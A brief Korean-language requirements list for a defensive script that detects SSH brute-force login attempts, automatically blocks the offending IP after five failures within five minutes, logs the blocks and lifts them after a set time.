- SSH 브루트포스 탐지 시 자동으로 IP를 차단하는 스크립트 작성
- 임계값: 5분 내 5회 실패 시 자동 차단
- 차단 로그 기록 및 일정 시간 후 자동 해제 기능 포함
